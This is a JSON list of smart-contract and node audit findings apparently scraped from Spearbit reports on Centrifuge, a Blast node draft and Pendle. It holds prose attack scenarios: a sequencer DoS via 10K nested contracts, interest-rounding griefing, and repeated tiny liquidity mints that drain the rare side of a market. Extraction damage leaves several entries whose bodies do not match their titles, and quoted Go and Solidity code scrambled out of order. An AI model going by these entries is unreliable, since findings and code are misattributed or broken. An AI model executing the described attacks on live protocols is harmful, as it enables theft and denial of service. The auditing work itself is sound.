        "title": "Unclear when to use lockDepositRequest()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The function lockDepositRequest() is meant for users that would like to interact with the protocol but don't have permissions yet. However there is not an easy way to figure out the need to call this function or directly use requestDeposit().",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "deployVault() could be called immediately after removeVault()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The deployVault() is a permissionless function and could be called immediately after remove- Vault(). This will make it impossible to completely remove a vault.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "It is not obvious that there are two escrows",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The variable escrow is used by most contracts. It is not obvious the CentrifugeRouter uses one instance and all the other contracts use another instance. It can only be seen in the deployer script.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "RequestId value of 0 is not obvious",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Several functions are called with a value of 0, where it is not obvious what this value means. Note: ERC7540Vault does have a constant for this value: uint256 private constant REQUEST_ID = 0;",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational CentrifugeRouter.sol#L152, Cen-"
        ]
    },
    {
        "title": "Value of wards[] is set directly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The values for wards is set directly in the code, which is more error phrone and makes maintenance of the code more difficult.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational Adapter.sol#L54,"
        ]
    },
    {
        "title": "denyVault() doesn't undo all actions of newVault()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The denyVault() function doesn't undo the vault.rely(wards_[i]).",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "deployVault() has fewer checks than removeVault()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The removeVault() does have an additional check: require(pools[poolId].createdAt != 0, \"PoolManager/pool-does-not-exist\"); The extra check is not necessary because the check for tranche.token != address(0) implicitly also checks this, but it is not consistent",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Any tokens left in CentrifugeRouter can be used by anyone",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "Any tokens left in CentrifugeRouter can be used by anyone, for example via the _approveMax() where you can approve for any random token. According to the project: This is a design decision: a user needs to ensure no tokens are remaining in the Centrifuge Router at the end of the multicall. This might not be obvious to users of the CentrifugeRouter.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variable name balances doesn't cover all use cases",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "The balances variable includes both balance and hook data, but its name doesn't accurately repre- sent all the information it contains. The recommendation is to rename balances to balancesAndHookData to make it",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused definition for newTransferProxy() with two parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "There is no implementation for newTransferProxy() with two parameters. Note: there is one with one parameter. TransferProxyFactoryLike is also never inherited from.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Like interfaces don't start with an I",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Centrifuge-Spearbit-Security-Review-July-2024.pdf",
        "body": "All the ...Like interfaces are not prefixed with an I. Usually a I prefix is used to indicate interfaces.",
        "labels": [
            "Spearbit",
            "Centrifuge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Gas tracking introduces resource consumption related DOS",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "Blast introduces gas tracking so that developers have new ways to capture revenue. There are two forms of DOS that this might introduce. The first is related to gas consumption and is mentioned in the notion doc provided by the blast team. The second is actual node resource consumption (eg. how long it takes to process a transaction and complete a state transition). This issue is referring to the later. In the current implementation every vmenv.Call() must initialize a new gas tracker that will keep track of the total gas used by each contract during the processing of a transaction. For each contract used during a transaction's execution overhead will also be incurred when SetState() commits the the state to disk. There are also some places with redundant hashing in the gas allocation code (ref. AllocateDevGas() contains redundant hashing issue). This increases resource overhead during the processing (example) as well as when the gas accounting is updated on state transitions. Blast aims to use the default optimism config which supports an upper bounds of 6 blocks per mainnet block (2 seconds per blast block). If extra resources consumed in every state transition do not carry adequate gas costs, then a malicious user could possibly DOS the sequencer by push the processing time outside of this 2 second bound. One example way to stress the node in this manner would be to deploy 10K contracts that are just nested calls into each other. Respecting the max call depth would require separating this into multiple call chains. Then a user can make ~30 calls that would call into all 10K contacts and force the gas tracker to track and update 10K storage slots in the state transition. The initial deploying of the 10K malicious contracts is a one time cost then abusing the sequencer with 10K storage updates each subsequent block would be relatively cheap. D R A F T  Limiting EVM call stack depth to prevent the 10K nested call attack mentioned above.  Reducing the config to a safe number of blast blocks to target per mainnet block.  Exploring other ways to prevent small calls from abusing this (limiting gas redemption for calls with at least X gas, making all call related opcodes cost increase if more than Y in a transactions, etc...).",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: High Risk"
        ]
    },
    {
        "title": "MemoryStateDB contains data race in DeleteState()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "Checks have been added for i[\"Shares\"][\"price\"], i[\"Gas\"][\"baseClaimRate\"], and i[\"L2BlastBridge\"][\"otherBridge\"]. However, the following news blast fields still do not have a check:",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "USDB predeployment is skipped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "USDB predeployment is skipped as highlighted above. Blast team says the USDB related code was commented as there was an issue with USDB's constructor and this has since been fixed outside of review scope.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "op-geth/core/vm/contracts.go change makes multiple methods less efficient",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "op-geth/core/vm/contracts.go contains multiple Run() methods for various hashing (and other re- lated) algorithms that appear to have been changed to include extra arguments (caller, db, and readOnly). These extra references are not needed and may slow down the use of these methods. This can increase the possibility of resource consumption related attacks on the node (see AllocateDevGas() contains redundant hashing and Gas tracking introduces resource consumption related DOS). D R A F T Context: op-geth/core/vm/gas_tracker.go#L66, op-geth/core/state_transition.go#L505, op-geth/core/vm/gas_- tracker.go#L28",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AllocateDevGas() contains redundant hashing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "AllocateDevGas() contains redundant calls to getHash() which performs the computationally ex- pensive Keccak256Hash algorithm. This is done twice for every contract that is used during a transaction. Having redundant computation can expose the node to resource consumption related DOS, exacerbating the attack men- tioned here. Gas tracking should be as implemented as efficient as possible in order to charge the lowest possible gas cost for call related opcodes as well as to prevent resource costs from exceeding appropriate gas costs.  AllocateDevGas() ! UpdateGasPredeploy() ! UpdateGasParameters() ! getStorageSlots() ! getH- Call chains entry points denoted in source by \"AUDIT COMMENT\" below (as seen in op-geth/core/vm/gas_- tracker.go#L35): The redundant calls are made through the following call chains: func (gtm *GasTracker) AllocateDevGas(gasPrice *big.Int, refund uint64, state StateDB, timestamp ,! // find scaled gas units parsedRawAmount := new(big.Int).SetUint64(rawAmount) scaledGasUnits := new(big.Int).Div(new(big.Int).Mul(remainingGas, parsedRawAmount), netGas) totalGasAccount.Add(totalGasAccount, scaledGasUnits) ash()  AllocateDevGas() ! getGasMode() ! getHash() uint64) { remainingGas := new(big.Int).SetUint64(gtm.gasUsed - refund) netGas := new(big.Int).SetUint64(gtm.gasUsed) accumulatedGas := new(big.Int) totalGasAccount := new(big.Int) blockTimestamp := new(big.Int).SetUint64(timestamp) for addr, rawAmount := range gtm.allocations { D R A F T accumulatedGas.Add(accumulatedGas, scaledGasUnits) // calculate gas in wei terms fee := new(big.Int).Mul(scaledGasUnits, gasPrice) // update gas predeploy if fee.Cmp(common.Big0) > 0 { // AUDIT COMMENT: getHash() call chain updateGasPredeploy(state, addr, fee, blockTimestamp) // skip allocation of gas to contracts that dont accumulate // AUDIT COMMENT: getHash() call chain gasMode := getGasMode(state, addr) if !gasMode { continue } } }",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "(b *blast) Run() caller authorization conditionals should be placed before input deserialization",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "(b *blast) Run() contains two code blocks performing byte deserialization that require an autho- rized caller. The first is the claimSelector handler and the second is the configureSelector handler. Neither of the conditionals (1, 2) that check the authorization of the caller have a dependency on solidityInput, which is a byte buffer originating from an untrusted source. Any user making a transaction calling these handlers can populate this buffer with whatever they want. Due to this there are currently multiple byte deserialization routines that are reachable by untrusted callers (1, 2). This is attack surface that does not need to be exposed. Moving these conditionals to the start of their respective handler routines will not only be more efficient in handling malformed calls but it will also reduce the code that the node exposes to untrusted inputs.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AllocateDevGas() divide-by-zero can cause denial of service scaledGasUnits := new(big.Int).Div(new(big.Int).Mul(remainingGas, parsedRawAmount), netGas) Description: The following line in AllocateDevGas() will panic(\"division by zero\") if netGas is 0:",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "The following line in AllocateDevGas() will panic(\"division by zero\") if netGas is 0: Severity: Low Risk Context: op-geth/core/vm/gas_tracker.go#L44 // authorize contract if caller != params.BlastAccountConfigurationAddress { return nil, ErrExecutionReverted } flags, err := solidityInput.readUint8() if err != nil { return nil, err } if readOnly || flags > 2 { return nil, ErrExecutionReverted D R A F T NewGasTracker() sets this field as 0 initially. There are a few ways that this field may continue to be 0 upon reaching this Div(). One is through the stateTransition()->TransitionDB()->innerTransitionDB()->AllocateDevGas() call chain in testing or offline state modifications. The other more serious possibility would be down-stream of the ApplyMessage() call chain that can originate from 16 possible functions including callContract(), Apply(), precacheTransaction(), applyTransaction(), It might also be possible for an attacker to abuse other gas tracking functionality like exempt and doCall(). precompiles or conditions triggering RefundGas() to control the value of netGas to trigger this panic. A malicious sequencer would have even more control.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No nil check on ZeroClaimRate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "Blast defines some new parameters:  common.Address GasAdmin ZeroClaimRate *hexutil.Big BaseClaimRate *hexutil.Big CeilClaimRate *hexutil.Big BaseGasSeconds *hexutil.Big CeilGasSeconds *hexutil.Big json:\"gasAdmin\" json:\"zeroClaimRate\" json:\"baseClaimRate\" json:\"ceilClaimRate\" json:\"baseGasSeconds\" json:\"ceilGasSeconds\"          It then does a zero or nil check on them expect for ZeroClaimRate: if d.BaseGasSeconds == nil { } if d.BaseClaimRate == nil { } if d.CeilGasSeconds == nil { } if d.CeilClaimRate == nil { } return fmt.Errorf(\"%w: Base Gas Seconds cannot be nil\", ErrInvalidDeployConfig) return fmt.Errorf(\"%w: Base Claim Rate cannot be nil\", ErrInvalidDeployConfig) return fmt.Errorf(\"%w: Ceil Gas Seconds cannot be nil\", ErrInvalidDeployConfig) return fmt.Errorf(\"%w: Ceil Claim Rate cannot be nil\", ErrInvalidDeployConfig)   D R A F T",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "SelfDestruct permanently deletes all unclaimed yield",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "This contains the TODO's mentions in the code which point to missing code implementation. This acts as more of a tracker/reminder that these need to be implemented.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Configuring a YieldClaimable account to YieldClaimable resets the claimable balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "Setting a flag of an account in YieldClaimable mode to again in YieldClaimable mode updates its fixed field to include the previous claimable balance, and the claimable amount goes to 0: D R A F T This is a special case where the yield mode isn't changed. Note that the claimable balance goes to 0 whenever the yield mode is changed but that may be expected if the new mode isn't YieldClaimable.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "SubClaimableAmount() can claim more than the maximum claimable balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "SubClaimableAmount(amount *big.Int) doesn't check that amount doesn't exceed the maximum claimable. The current call path checks this isn't the case before calling this function. However, a new invocation may not do that which could lead to issues with the miscalculated shares and remainder, affecting the system overall.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Op-geth and optimism contain multiple failing tests and code without tests",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "There are multiple tests that are failing or have been commented out. Some of these are Blast specific tests that are not inherited from upstream Optimism code. There are also multiple large portions of code that do not have any testing coverage for which tests should be created.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Referencing enums in their integer notation makes code less readable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "There are multiple places where Flags and gasMode are referenced or compared with integers. This makes the code less readable and more difficult to maintain.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Code diff can be explained in comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "Code diff ops/genesis/layer_two.go#L72-L76: from Optimism sometimes is not obvious for example at optimism/op-chain- } else if db.Exist(addr) { db.DeleteState(addr, AdminSlot) } else { // TODO(p): this is kinda weird. maybe we can just make a custom namespace so this behaves correctly db.CreateAccount(addr) 13  desiredAmount.Sign() < 0 ensures that desiredAmount amount is (cid:21) 0. Hence, it doesn't follow the com-",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "UseGasNatively() and UseGasForConstantCost() are duplicates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "UseGasNatively() and UseGasForConstantCost() have the same function body. One of them can be removed.",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/report-blast-node-review-draft.pdf",
        "body": "ment. // validate that desired amount is > 0 if desiredAmount.Sign() < 0 { return nil, ErrExecutionReverted }  This comment for UseGasWithOp() is copied from UseGas(): // UseGas attempts the use gas and subtracts it and returns true on success func (c *Contract) UseGasWithOp(gas uint64, op OpCode, evm *EVM) (ok bool) {",
        "labels": [
            "Spearbit",
            "report-blast-node-review-draft.pd",
            "Severity: Informational"
        ]
    },
    {
        "title": "Expanding reward token list right after linked YT expiration freezes the accumulated rewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "In some cases it is allowed to expand SY reward tokens list and this can happen after _setPostEx- piryData() has fixed the expiry state in one of the YTs linked to that SY. For example, if a new reward token was added to the Nitro pool, but not yet added to rewardTokens of CamelotV1Volatile SY, attacker can run any YT operation involving _setPostExpiryData() in the first block with its expiry <= block.timestamp and then run public updateRewardTokensList() of SY:  PendleCamelotV1VolatileSY.sol#L91-L104: function _getRewardTokens() internal view virtual override returns (address[] memory res) { // ,! << return rewardTokens; } /// @notice allows anyone to add new rewardTokens to this SY if a new rewardToken is added to ,! the Nitro pool function updateRewardTokensList() public virtual { if (nitroPool == address(0)) return; // if nitroPool is not set, we don  t need to update ,! rewardTokens list address token1 = ICamelotNitroPool(nitroPool).rewardsToken1().token; address token2 = ICamelotNitroPool(nitroPool).rewardsToken2().token; if (token1 != address(0) && token1 != xGRAIL && !rewardTokens.contains(token1)) ,! rewardTokens.push(token1); // << if (token2 != address(0) && token2 != xGRAIL && !rewardTokens.contains(token2)) ,! rewardTokens.push(token2); // << } After that reward redeeming will be blocked for all the holders of this YT as any redeemDueInterestAndRewards() -> _updateAndDistributeRewards() call will revert:  PendleYieldToken.sol#L160-L169: function redeemDueInterestAndRewards( address user, bool redeemInterest, bool redeemRewards ) external nonReentrant updateData returns (uint256 interestOut, uint256[] memory rewardsOut) { if (!redeemInterest && !redeemRewards) revert Errors.YCNothingToRedeem(); // if redeemRewards == true, this line must be here for obvious reason // if redeemInterest == true, this line must be here because of the reason above _updateAndDistributeRewards(user); // <<  RewardManagerAbstract.sol#L35-L41 4 function _updateAndDistributeRewardsForTwo(address user1, address user2) internal virtual { (address[] memory tokens, uint256[] memory indexes) = _updateRewardIndex(); // << if (tokens.length == 0) return; if (user1 != address(0) && user1 != address(this)) _distributeRewardsPrivate(user1, tokens, ,! indexes); // << if (user2 != address(0) && user2 != address(this)) _distributeRewardsPrivate(user2, tokens, ,! indexes); }  PendleYieldToken.sol#L472-L480: function _updateRewardIndex() internal override returns (address[] memory tokens, uint256[] ,! memory indexes) { tokens = getRewardTokens(); if (isExpired()) { indexes = new uint256[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) indexes[i] = ,! postExpiry.firstRewardIndex[tokens[i]]; // << } else { indexes = IStandardizedYield(SY).rewardIndexesCurrent(); } } As index = postExpiry.firstRewardIndex[new_token] == 0, not being initialized, while userIndex will be set to INITIAL_REWARD_INDEX.Uint128() == 1, and deltaIndex = index - userIndex = 0 - 1:  RewardManagerAbstract.sol#L44-L65: function _distributeRewardsPrivate(address user, address[] memory tokens, uint256[] memory ,! indexes) private { assert(user != address(0) && user != address(this)); uint256 userShares = _rewardSharesUser(user); for (uint256 i = 0; i < tokens.length; ++i) { address token = tokens[i]; uint256 index = indexes[i]; // << uint256 userIndex = userReward[token][user].index; if (userIndex == 0) { userIndex = INITIAL_REWARD_INDEX.Uint128(); // << } if (userIndex == index) continue; uint256 deltaIndex = index - userIndex; // << uint256 rewardDelta = userShares.mulDown(deltaIndex); uint256 rewardAccrued = userReward[token][user].accrued + rewardDelta; userReward[token][user] = UserReward({index: index.Uint128(), accrued: ,! rewardAccrued.Uint128()}); }  RewardManagerAbstract.sol#L16: uint256 internal constant INITIAL_REWARD_INDEX = 1; Impact: since rewardTokens list is append only and _setPostExpiryData() can't be run again, all the rewards within userRewardOwed balances will be permanently frozen in the YT contract. 5 Likelihood: Low (SY with an expanding reward token list and not yet added reward token is a prerequisite) + Impact: Critical (most of the rewards are end up frozen) = Severity: High.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: High Risk"
        ]
    },
    {
        "title": "User can be denied interest income due to interest amount rounding",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "redeemDueInterestAndRewards() can be triggered not in the best interests of a user. If the ex- change rate is big enough in L2 environment this can form a griefing surface, given that there is a precision re- duction with rounding down in interest calculation (and the minimal increment figure, currentIndex - prevIndex, can have much less magnitude than prevIndex and currentIndex):  _distributeInterestPrivate(), InterestManagerYT.sol#L75-L79: uint256 principal = _YTbalance(user); uint256 interestFromYT = (principal * (currentIndex - prevIndex)).divDown(prevIndex * ,! currentIndex); userInterest[user].accrued += interestFromYT.Uint128(); 6  PMath.sol#L48-L53: function divDown(uint256 a, uint256 b) internal pure returns (uint256) { uint256 aInflated = a * ONE; unchecked { return aInflated / b; } } For example, an attacker can call redeemDueInterestAndRewards(user, true, false) for a target user after every known IBT index update (i.e. after every IStandardizedYield(SY).exchangeRate() uptick), minimizing the interest for them via rounding. In a somewhat stretched, yet theoretically possible, example, suppose Bob the user has YT balance of 38e12 (in 18 dp, so it's 38e-6 of the one whole unit), with underlying being some very old ETH liquid staked derivative with prevIndex = 9e6 * 1e18 (say ETH worth 10000 USD and one whole unit of this derivative was worth 9e6 * 10000 = 90 bln USD, while Bob's position was worth 38e12 * 9e6 * 10000 / 1e18 = 3_420_000 USD), with current rate and index being exchangeRate() = currentIndex = 9e6 * e18 + 2.08e18, where 9e24 * 0.01 / (60 * 24 * 30) = 2.08e18 (rounded for brevity). That corresponds to once per hour updates yielding 1 p.p. in one month. Let's suppose that this is close to typical increment of this index, given the increment frequency and its median yield (so it's 1% monthly, close to 12% APY). Then interestFromYT = 38e12 * 2.08e18 * 1e18 / ((9e24 + 2.08e18) * 9e24) = 0 (0.976... truncated). If attacker keeps this up for a month, calling redeemDueInterestAndRewards() once an hour, then 0.01 * 38e12 * 9e6 * 10000 / 1e18 = 0.01 * 3420000 = 34200 USD worth of interest was stolen from Bob. In order for attacker to spend less than Bob loses, so the griefing be viable, it should cost less than 34200 / (60 * 24 * 30) = 0.79 USD to perform each call, which is 10-50 times higher than current L2 costs. The key assumption here is the usage of this inflated index, but apart from some derivative being very old there might be other more immediate reasons for such a grouping (e.g. one unit of the index can start with some minimal stake or with some initial capitalization, and so on, as there are no obligations for such derivatives to be tied to one monetary unit). Impact: any user with balance of eligible magnitude can be denied all the interest income as a griefing. This income will not be retrievable as only explicitly defined after expiry income, totalSyInterestForTreasury, is due for the treasury, all the other excess income, including rounding residual, which is amplified by the attack, is frozen with the contract. Likelihood: Low (the key prerequisite is index being substantially inflated) + Impact: High (the whole interest income of a target user can be frozen) = Severity: Medium.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Rounding down of the amounts used in liquidity provision logic allows for stealing from market rare side when gas is cheap enough",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "Truncation of the syUsed/ptUsed variables can allow to receive LP without supplying a rare side of the market. Supplying low enough ptDesired (with big syDesired that will be discarded) to have syUsed == 0 or low enough syUsed to have ptUsed == 0 can be repeated many times in L2 environment, while burning can be done at bulk thereafter, stealing the aggregated position of this rare side from the existing LPs. The high proportion (rare asset) case is guarded by controlling for MAX_MARKET_PROPORTION = (1e18 * 96) / 100. Using it as a simple example and ignoring fees, say totalLp = 100e18, totalPt = 95e18, totalSy = 5e18 is a current non-manipulated market state (PT is cheap and equilibrium interest rate is high). Bob the attacker can run mint() -> addLiquidity() with ptDesired = 18 (18 wei), syDesired = 1e36, having netLpByPt = (ptDesired * market.totalLp) / market.totalPt = 18 * 100e18 / 95e18 = 18, netLpByPt < netLpBySy, lpToAccount = ptUsed = 18, syUsed = (market.totalSy * lpToAccount) / market.totalLp = (5e18 * 18) / 100e18 = 0. Repeating this 1e7 times (there is no impact on the output yet as Bob's share accumulates very slowly, 18 * (100e18 + 18e7) / (95e18 + 18e7) = 18), Bob spends 18e7 PT and obtains 18e7 LP. They can then burn() the whole stake, receiving netSyToAccount = (lpToRemove * market.totalSy) / market.totalLp = (18e7 * 5e18) / (100e18 + 18e7) = 0.9e7 - 1 SY and netPtToAccount = (lpToRemove * market.totalPt) / mar- ket.totalLp = 18e7 * (95e18 + 18e7) / (100e18 + 18e7) = 17.1e7 PT, with the net impact being spending 18e7 - 17.1e7 = 0.9e7 PT and gaining 0.9e7 - 1 SY. Since PT was cheap this very close to 1-to-1 PT to SY conversion represents a gain for Bob as long as gas costs are low enough. Likelihood: Medium + Impact: Low = Severity: Low.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Asset amount user owes in swapSyForExactPt can be understated with rounding down of a positive integer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "When netPtToAccount > 0 rounding down can reduce the asset amount, preFeeAssetToAccount, that determines what is owed by the caller.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Rebasing down of any reward token can freeze YT and LP transfers, YT and treasury rewards re- deeming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "1. If any reward token is rebasing (e.g. stETH) and gets slashed after _setPostExpiryData() execution then there will be no any rewards for treasury from this expired SY until that reward token balance restores as _selfBalance(tokens[i]) - postExpiry.userRewardOwed[tokens[i]] will be reverting.  PendleYieldToken.sol#L192-L210: function redeemInterestAndRewardsPostExpiryForTreasury() external nonReentrant updateData returns (uint256 interestOut, uint256[] memory rewardsOut) { // ... for (uint256 i = 0; i < tokens.length; i++) { rewardsOut[i] = _selfBalance(tokens[i]) - postExpiry.userRewardOwed[tokens[i]]; emit CollectRewardFee(tokens[i], rewardsOut[i]); } Since the reward token list is fixed or being append only SY implementations the waiting or manual topping up look to be the only options in that case. 2. If any of the reward tokens be rebased downwards (get slashed), _updateRewardIndex() will be similarly blocked until its balance gets restored above lastBalance:  RewardManager.sol#L43: uint256 accrued = _selfBalance(tokens[i]) - lastBalance; This will make unavailable YT and LP token transfers and YT's redeemDueInterestAndRewards() via blocking YT._updateRewardIndex() and YT._setPostExpiryData() as YT.rewardIndexesCurrent() -> SY.rewardIndexesCurrent() -> RM._updateRewardIndex() sequence utilized in both cases will revert.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Interest and reward fee rates are back propagated when changed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "Interest and reward fee rates are applied backwards when changed, i.e. new fee rates are applied to the periods where old fee rates were active:  InterestManagerYT.sol#L43-L54: function _doTransferOutInterest( // ... ) internal returns (uint256 interestAmount) { address treasury = IPYieldContractFactory(factory).treasury(); uint256 feeRate = IPYieldContractFactory(factory).interestFeeRate(); // << // ... uint256 feeAmount = interestPreFee.mulDown(feeRate);  PendleYieldToken.sol#L429-L444: 10 function __doTransferOutRewardsLocal( // ... ) internal returns (uint256[] memory rewardAmounts) { address treasury = IPYieldContractFactory(factory).treasury(); uint256 feeRate = IPYieldContractFactory(factory).rewardFeeRate(); // << // ... for (uint256 i = 0; i < tokens.length; i++) { // ... uint256 feeAmount = rewardPreFee.mulDown(feeRate); Likelihood: Medium (fees can be changed as a part of usual workflow) + Impact: Medium (fee rates are applied incorrectly) = Severity: Medium.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "LP valuation can be overstated, while rateOracle precision can be reduced in PendleLpOracleLib",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "1. tradeSize of in _getLpToAssetRateRaw() cParam.mulDown(comp.totalAsset) - state.totalPt, can be either positive or negative based on the sign cParam = LogExp- Math.exp(comp.rateScalar.mulDown((rateOracle - comp.rateAnchor)) can vary from 0 to being large enough since its based on the rateOracle - comp.rateAnchor = rateOracle - newExchangeRate + lnProportion.divDown(rateScalar), which can differ depending on the evolution of the rate. where Positive tradeSize means asset was removed from the pool and PT was added. In this case rounding down in comp.totalAsset - tradeSize.divDown(rateHypTrade) expression overstates the assets as the removed part is being rounded down, which is the equivalent of the remaining part being rounded up. 2. rateOracle is subject to two divisions, reducing its precision, which can be avoided as these operations cancel each other:  PendleLpOracleLib.sol#L79: rateOracle = PMath.IONE.divDown(market.getPtToAssetRateRaw(duration).Int());  PendlePtOracleLib.sol#L48: return PMath.ONE.divDown(assetToPtRate);",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Redundant expiry check in MarketMathCore.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
        "body": "In MarketMathCore.sol, both executeTradeCore() and getMarketPrecompute() check for expiry of the underlying YT/PT pair. Since getMarketPrecompute() is only called by executeTradeCore(), these two checks are redundant and one could be removed.",
        "labels": [
            "Spearbit",
            "Pendle",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unreachable instance of MarketExchangeRateBelowOne error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Pendle-Spearbit-Security-Review-July-2024.pdf",
